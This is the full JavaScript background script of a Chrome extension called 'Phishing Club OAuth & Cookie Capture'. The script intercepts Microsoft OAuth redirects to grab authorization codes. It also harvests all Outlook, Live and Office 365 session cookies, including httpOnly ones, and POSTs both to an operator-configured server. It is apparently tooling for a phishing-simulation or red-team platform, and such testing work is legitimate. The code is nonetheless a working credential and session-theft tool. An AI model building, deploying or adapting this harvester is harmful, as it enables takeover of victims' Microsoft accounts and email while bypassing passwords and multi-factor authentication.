/**
 * Phishing Club OAuth & Cookie Capture - Background Script
 * Chrome Extension v1.0.0
 *
 * HOW IT WORKS:
 *   METHOD 1 - OAuth Capture:
 *     1. User enters their Phishing Club URL in the popup
 *     2. Extension connects & verifies the server via /api/extension/ping
 *     3. User starts OAuth flow (needs Azure App Client ID)
 *     4. Extension detects the OAuth redirect and captures the authorization code
 *     5. The code is POSTed to: <Server URL>/api/extension/oauth/callback
 *
 *   METHOD 2 - Cookie Capture:
 *     1. User is already signed into Outlook in their browser
 *     2. Click "Capture Cookies" in the popup
 *     3. Extension grabs all session cookies from Outlook domains
 *     4. Cookies are POSTed to: <Server URL>/api/extension/cookies/save
 */

const OAUTH_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com',
  'account.live.com'
];

const OAUTH_REDIRECT_PATTERNS = [
  'https://login.microsoftonline.com/common/oauth2/nativeclient',
  'https://login.live.com/oauth20_desktop.srf',
  'http://localhost'
];

const COOKIE_URLS = [
  'https://outlook.live.com/',
  'https://outlook.office365.com/',
  'https://outlook.office.com/',
  'https://live.com/',
  'https://login.live.com/',
  'https://login.microsoftonline.com/',
  'https://substrate.office.com/',
  'https://office.com/',
  'https://office365.com/',
  'https://m365.cloud.microsoft.com/',
  'https://account.live.com/',
];

let serverConnected = false;

// Extension installed
chrome.runtime.onInstalled.addListener(() => {
  console.log('Phishing Club OAuth Capture installed');
  chrome.storage.local.set({
    enabled: true,
    autoCapture: true,
    notifications: true,
    capturedTokens: [],
    serverUrl: ''
  });
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'Phishing Club OAuth Capture',
    message: 'Extension installed! Enter your Phishing Club URL in the popup to connect.'
  });
});

// Watch for OAuth redirects - Tab URL changes
chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.url) {
    checkForOAuthCode(changeInfo.url, tabId);
  }
});

// Watch for OAuth redirects - Web request interception
chrome.webRequest.onBeforeRequest.addListener(
  (details) => checkForOAuthCode(details.url, details.tabId),
  { urls: ['https://login.microsoftonline.com/*', 'https://login.live.com/*', 'https://account.live.com/*'] }
);

// Check URL for an OAuth authorization code
async function checkForOAuthCode(url, tabId) {
  try {
    const urlObj = new URL(url);
    const isOAuthDomain = OAUTH_DOMAINS.some(d => urlObj.hostname === d);
    const isRedirect = OAUTH_REDIRECT_PATTERNS.some(p => url.startsWith(p));
    if (!isOAuthDomain && !isRedirect) return;

    const code = urlObj.searchParams.get('code') || extractFromHash(urlObj.hash, 'code');
    if (!code) return;

    const settings = await chrome.storage.local.get(['enabled', 'autoCapture', 'notifications', 'serverUrl']);
    if (!settings.enabled) return;

    console.log('OAuth code captured:', code.substring(0, 30) + '...');
    const state = urlObj.searchParams.get('state') || extractFromHash(urlObj.hash, 'state');

    const tokenData = {
      code,
      state,
      url,
      timestamp: new Date().toISOString(),
      sent: false,
    };

    await saveToken(tokenData);

    if (settings.autoCapture && settings.serverUrl) {
      const result = await sendToServer(settings.serverUrl, tokenData);
      tokenData.sent = result.success;
      await updateLastTokenStatus(result.success);
    }

    if (settings.notifications) {
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: tokenData.sent ? 'OAuth Code Sent!' : 'OAuth Code Captured',
        message: tokenData.sent
          ? 'Authorization code sent to Phishing Club successfully!'
          : settings.serverUrl
            ? 'Code captured but could not send to server. Check connection.'
            : 'Code captured! Set your Phishing Club URL in the popup to auto-send.',
        priority: 2
      });
    }

    chrome.action.setBadgeText({ text: 'OK' });
    chrome.action.setBadgeBackgroundColor({ color: tokenData.sent ? '#4CAF50' : '#FF9800' });
    setTimeout(() => chrome.action.setBadgeText({ text: '' }), 5000);

    try { chrome.tabs.sendMessage(tabId, { action: 'showIndicator' }); } catch (_) {}
  } catch (err) {
    console.error('Error checking URL for OAuth code:', err);
  }
}

function extractFromHash(hash, key) {
  if (!hash || hash.length < 2) return null;
  return new URLSearchParams(hash.substring(1)).get(key);
}

// Send captured code to Phishing Club
async function sendToServer(serverUrl, tokenData) {
  const base = serverUrl.replace(/\/+$/, '');
  const callbackUrl = `${base}/api/extension/oauth/callback`;
  try {
    const resp = await fetch(callbackUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: tokenData.code, state: tokenData.state }),
    });
    if (!resp.ok) {
      const text = await resp.text();
      console.error('Server returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }
    const result = await resp.json();
    return { success: result.success === true, message: result.message };
  } catch (err) {
    console.error('sendToServer failed:', err.message);
    return { success: false, error: err.message };
  }
}

// Test server connection
async function testConnection(serverUrl) {
  const base = serverUrl.replace(/\/+$/, '');
  const pingUrl = `${base}/api/extension/ping`;
  try {
    const resp = await fetch(pingUrl, { method: 'GET' });
    if (!resp.ok) {
      serverConnected = false;
      return { success: false, error: `Server returned ${resp.status}` };
    }
    const data = await resp.json();
    serverConnected = data.success === true;
    return { success: serverConnected, message: data.message || 'Connected' };
  } catch (err) {
    serverConnected = false;
    return { success: false, error: `Cannot reach server: ${err.message}` };
  }
}

// Local storage helpers
async function saveToken(tokenData) {
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  tokens.unshift(tokenData);
  if (tokens.length > 50) tokens.splice(50);
  await chrome.storage.local.set({ capturedTokens: tokens });
}

async function updateLastTokenStatus(sent) {
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  if (tokens.length > 0) {
    tokens[0].sent = sent;
    await chrome.storage.local.set({ capturedTokens: tokens });
  }
}

// Cookie Capture Engine
async function captureCookies() {
  const allCookies = [];
  const seenKeys = new Set();

  for (const url of COOKIE_URLS) {
    try {
      const cookies = await chrome.cookies.getAll({ url });
      for (const cookie of cookies) {
        const key = `${cookie.domain}|${cookie.name}|${cookie.path}`;
        if (!seenKeys.has(key)) {
          seenKeys.add(key);
          allCookies.push({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite,
            expirationDate: cookie.expirationDate,
            session: cookie.session,
          });
        }
      }
    } catch (err) {
      console.warn(`Failed to get cookies for ${url}:`, err);
    }
  }

  if (allCookies.length === 0) {
    return { success: false, count: 0, error: 'No Outlook cookies found. Are you signed in?' };
  }

  const domainGroups = {};
  for (const c of allCookies) {
    const d = c.domain.replace(/^\./, '');
    if (!domainGroups[d]) domainGroups[d] = [];
    domainGroups[d].push(c);
  }

  const captureEntry = {
    id: Date.now().toString(36),
    timestamp: new Date().toISOString(),
    cookies: allCookies,
    domainGroups,
    totalCount: allCookies.length,
    sent: false,
  };

  const result = await chrome.storage.local.get(['capturedCookies']);
  const captures = result.capturedCookies || [];
  captures.unshift(captureEntry);
  if (captures.length > 20) captures.splice(20);
  await chrome.storage.local.set({ capturedCookies: captures });

  const settings = await chrome.storage.local.get(['autoCapture', 'serverUrl', 'notifications']);
  if (settings.autoCapture && settings.serverUrl) {
    const sendResult = await sendCookiesToServer(settings.serverUrl, captureEntry);
    captureEntry.sent = sendResult.success;
    const updated = await chrome.storage.local.get(['capturedCookies']);
    const list = updated.capturedCookies || [];
    if (list.length > 0) {
      list[0].sent = sendResult.success;
      await chrome.storage.local.set({ capturedCookies: list });
    }
  }

  if (settings.notifications) {
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon128.png',
      title: captureEntry.sent ? 'Cookies Sent!' : 'Cookies Captured',
      message: `Captured ${allCookies.length} cookies from ${Object.keys(domainGroups).length} Outlook domains.`,
      priority: 2,
    });
  }

  return {
    success: true,
    count: allCookies.length,
    domains: Object.keys(domainGroups),
    sent: captureEntry.sent,
  };
}

// Send captured cookies to Phishing Club
async function sendCookiesToServer(serverUrl, cookieData) {
  const base = serverUrl.replace(/\/+$/, '');
  const saveUrl = `${base}/api/extension/cookies/save`;
  try {
    const resp = await fetch(saveUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cookies: cookieData.cookies,
        timestamp: cookieData.timestamp,
        domains: Object.keys(cookieData.domainGroups || {}),
        totalCount: cookieData.totalCount,
      }),
    });
    if (!resp.ok) {
      const text = await resp.text();
      console.error('Cookie save returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }
    const result = await resp.json();
    return { success: result.success === true, message: result.message };
  } catch (err) {
    console.error('sendCookiesToServer failed:', err.message);
    return { success: false, error: err.message };
  }
}

// Message handler (popup.js & content.js)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'oauthRedirect') {
    checkForOAuthCode(request.url, sender.tab?.id);
    sendResponse({ received: true });
    return false;
  }
  if (request.action === 'getTokens') {
    chrome.storage.local.get(['capturedTokens'], (r) => {
      sendResponse({ tokens: r.capturedTokens || [] });
    });
    return true;
  }
  if (request.action === 'clearTokens') {
    chrome.storage.local.set({ capturedTokens: [] }, () => sendResponse({ success: true }));
    return true;
  }
  if (request.action === 'getSettings') {
    chrome.storage.local.get(['enabled', 'autoCapture', 'notifications', 'serverUrl'], (r) => {
      sendResponse({ ...r, connected: serverConnected });
    });
    return true;
  }
  if (request.action === 'updateSettings') {
    chrome.storage.local.set(request.settings, () => sendResponse({ success: true }));
    return true;
  }
  if (request.action === 'testConnection') {
    testConnection(request.serverUrl)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }
  if (request.action === 'sendToken') {
    sendToServer(request.serverUrl, request.tokenData)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }
  if (request.action === 'captureCookies') {
    captureCookies()
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }
  if (request.action === 'getCapturedCookies') {
    chrome.storage.local.get(['capturedCookies'], (r) => {
      sendResponse({ cookies: r.capturedCookies || [] });
    });
    return true;
  }
  if (request.action === 'clearCookies') {
    chrome.storage.local.set({ capturedCookies: [] }, () => sendResponse({ success: true }));
    return true;
  }
  if (request.action === 'sendCookies') {
    sendCookiesToServer(request.serverUrl, request.cookieData)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }
});

console.log('Phishing Club Capture - background script loaded (OAuth + Cookies)');
